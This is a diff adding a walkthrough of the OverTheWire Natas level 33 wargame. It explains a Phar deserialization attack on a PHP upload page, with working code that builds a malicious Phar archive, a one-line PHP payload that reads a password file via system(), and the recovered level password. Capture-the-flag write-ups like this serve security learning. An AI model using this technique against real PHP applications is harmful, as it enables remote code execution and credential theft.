@@ -903,3 +903,109 @@ Doing `ls .` command will returl all the files in the webroot. I noticed that th
 Username: natas33
 URL:      http://natas33.natas.labs.overthewire.org
 ```
+
+This website lets us upload a "firmware update". This lets you upload any file to the website. 
+
+It also renames the file, but this is very similar to a previous Natas level, where all you need to do is inspect element and change the HTML value. At line 20, you can upload a file with any specific name by changing `value`.
+
+> `<input type="hidden" name="filename" value="(filename)" />`
+
+Looking at the source code, it seems like the uploaded file initializes a new `Executor` object. The code is as follows:
+
+> ```php
+> class Executor{
+>     private $filename=""; 
+>     private $signature='adeafbadbabec0dedabada55ba55d00d';
+>     private $init=False;
+> 
+>     function __construct(){
+>         $this->filename=$_POST["filename"];
+>         if(filesize($_FILES['uploadedfile']['tmp_name']) > 4096) {
+>             echo "File is too big<br>";
+>         }
+>         else {
+>             if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], "/natas33/upload/" . $this->filename)) {
+>                 echo "The update has been uploaded to: /natas33/upload/$this->filename<br>";
+>                 echo "Firmware upgrad initialised.<br>";
+>             }
+>             else{
+>                 echo "There was an error uploading the file, please try again!<br>";
+>             }
+>         }
+>     }
+>     function __destruct(){
+>         // upgrade firmware at the end of this script
+> 
+>         // "The working directory in the script shutdown phase can be different with some SAPIs (e.g. Apache)."
+>         chdir("/natas33/upload/");
+>             if(md5_file($this->filename) == $this->signature){
+>                 echo "Congratulations! Running firmware update: $this->filename <br>";
+>                 passthru("php " . $this->filename);
+>             }
+>             else{
+>                 echo "Failur! MD5sum mismatch!<br>";
+>             }
+>         }
+>     }
+> ```
+
+I noticed from this code multiple things:
+
+1. The destruct function checks if the file's MD5 hash matches with the provided signature using `md5_file()`. Weirdly, the signature is provided inside the class as a private variable.
+
+2. If the hashes match, it will run the PHP file. So it expects a PHP file to be uploaded.
+
+3. All files end up in the same directory.
+
+4. The file can't be uploaded if its bigger than 4096 bytes. so it seems like hash collision isn't an option.
+
+One thing of interest is the above `_destruct` function. Apparantly this function allows for a Phar (PHP archive) deserialization attack, by uploading a Phar file that also contains an `Executor` object. Then the `_destruct` function can run on our own object, which will allow our PHP file to be ran. 
+
+First thing to do was make a new PHP file `pass.php`, that only has the line to read the password: `<?php system('cat /etc/natas_webpass/natas34'); ?>` Upload it to the website with the same name.
+
+Then, make another PHP file (name is unimportant) with the following code:
+
+```php
+<?php
+    class Executor {
+	    private $filename = "pass.php"; 
+        private $signature = True;
+        private $init = false;
+    }
+
+	$phar = new Phar("pass_archive.phar");
+	$phar->startBuffering();
+	$phar->addFromString("test.txt", 'test');
+	$phar->setStub("<?php __HALT_COMPILER(); ?>");
+
+    $o = new Executor();
+	$phar->setMetadata($o);
+	$phar->stopBuffering();
+?>
+```
+
+The `Executor` class is the same class as from the source code, but the filename is `pass.php`, and the signature is just a `True` value so that it passes the signature check. It then makes a new `Phar` object with the file name `pass_archive.phar`. After that is just code that I [took from here](https://book.hacktricks.xyz/pentesting-web/file-inclusion/phar-deserialization).
+
+Run it, and it should generate the new phar file `pass_archive.phar` for you. Upload it to the website with the same name.
+
+> If you get an error when running, you may need to edit your php.ini file so that it allows phar file editing. Find the location by doing `php --ini`, then search for `phar.readonly = On`. Uncomment the line and set it to `phar.readonly = Off`.
+
+Once the two files are uploaded. upload `pass_archive.phar` again. This time, set the filename to `phar://pass_archive.phar`. Uploading this will force the website to actually parse the phar file, and then run the php file to get our password.
+
+You'll get some error messages on top, but the bottom text will show the password.
+
+```
+Congratulations! Running firmware update: pass.php
+j4O7Q7Q5er5XFRCepmyXJaWCSIrslCJY 
+```
+
+# 34
+
+```
+Username: natas34
+URL:      http://natas34.natas.labs.overthewire.org
+```
+
+```
+
+```
